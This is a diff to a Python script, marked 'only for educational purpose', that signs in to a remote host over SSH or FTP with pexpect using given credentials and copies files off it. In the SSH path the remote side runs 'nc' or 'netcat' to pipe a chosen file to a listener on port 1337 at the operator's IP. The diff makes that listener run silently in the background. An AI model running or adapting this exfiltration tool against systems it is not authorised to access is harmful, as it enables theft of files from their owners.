@@ -1,5 +1,5 @@
 '''
-it is a script that suppose to run in a Linux System. otherwise, it won't run properly
+it is a script that suppose to run in a Linux System. otherwise, it won't run properly! 
 you can try it in windows and see yourself how fucked up this script is for windows.
 '''
 import pexpect
@@ -7,6 +7,7 @@ import argparse
 import re
 import ntpath
 import os
+
 parser = argparse.ArgumentParser(description="only for educational purpose!\n Our program use 1337 port. so, please make sure that you must not have any other service running on this port.")
 parser.add_argument("-P","--protocol",help="choose SSH or FTP", type=str, required=True)
 parser.add_argument("-u", "--username", help="username on the choosen port", required=True)
@@ -35,12 +36,9 @@ def ssh_connector():
         try:
             child.sendline(f"nc {args.myip} 1337 < {wants_to_download_file} ")
         except:
-            print("nc command didnn't work. trying netcat...\n")
+            print("nc command didn't work. trying netcat...\n")
             child.sendline(f"netcat {args.myip} 1337 < {wants_to_download_file}")  
-        else:
-            print("trying the last option!\n")
-            os.system(f"scp {username}@{server_ip}:{wants_to_download_file} /root/Desktop/")
-            print("You should have the file on your desktop")
+
     elif i == 1:
         print("Given info. was not correct!")
         child.kill(0)
@@ -71,16 +69,13 @@ def ftp_connector():
         print("You are doing something wrong!\n")
         exit(0)
 
-
-
 if args.protocol == "ssh":
-    print("Ok, we will try to download file with different options!")
-    os.system(f"nc -lvp 1337 >{d_file} &")
+    print(f"Grabbing file {d_file} from SSH...\n")
+    os.system(f"nc -lvp 1337 >{d_file} &>/dev/null &")
     ssh_connector()
-
+    
 elif args.protocol == "ftp":
-    print(f"You want to grab {d_file} file with FTP!")
+    print(f"Grabbing file {d_file} from FTP...\n")
     ftp_connector()
 else:
     print("Wrong protocol\n Choose from [ftp/ssh]")
-
